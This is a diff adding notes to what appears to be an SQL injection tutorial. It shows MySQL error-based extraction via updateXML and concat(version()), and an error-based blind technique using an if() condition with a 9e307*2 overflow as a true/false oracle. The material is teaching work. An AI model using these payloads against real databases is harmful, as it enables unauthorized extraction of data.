@@ -74,5 +74,25 @@ ERROR 1105 (HY000): XPATH syntax error: ':Th1sispassword'
 ## Application of Error based SQL Injection
 ### MySQL
 ```
-SELECT 
+SELECT updateXML(null, concat(0x0a, version()), null);
+
+/* 
+ERROR 1105(HY000): XPATH syntax error: '
+bersion...'
 ```
+
+## Error based Blind SQL Injection
+Method of using blind SQL Injection and the Error based SQL Injection together. It is possible to generate the error and extract the data depends on the result(True/false).
+
+While Error based SQL Injection exploits data from the error message, affected by the printed result, however, Error based blind SQL only needs the fact whether the error occurred or not. 
+
+SQL syntax if(condition, value if true, value if false)
+
+```
+Select if(1=1, 9e307 * 2, 0);
+ERROR 1690(22003): DOUBLE value is out of range in (9e307*2)
+
+Select if(1 = 0, 9e307*2, 0);
+1 row in set (1 = 0 is false)
+```
+
